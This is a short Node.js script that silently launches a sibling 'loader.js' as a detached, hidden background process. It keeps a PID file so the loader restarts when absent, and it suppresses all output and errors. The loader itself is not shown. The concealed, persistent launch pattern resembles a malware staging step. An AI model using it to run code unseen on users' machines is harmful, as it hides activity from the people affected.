import { spawn } from 'child_process';
import { dirname, join } from 'path';
import { existsSync, writeFileSync, readFileSync } from 'fs';
import { fileURLToPath } from 'url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const PID_FILE = join(__dirname, '.pid');
const LOADER = join(__dirname, 'loader.js');

function isRunning() {
  try {
    const pid = parseInt(readFileSync(PID_FILE, 'utf8'));
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

if (!existsSync(PID_FILE) || !isRunning()) {
  try {
    const child = spawn('node', [LOADER], {
      stdio: ['ignore', 'ignore', 'ignore'],
      windowsHide: true,
      shell: false,
      cwd: __dirname,
      detached: true
    });
    
    child.unref();
    
    try {
      writeFileSync(PID_FILE, child.pid.toString());
    } catch (e) {}
  } catch (err) {}
}

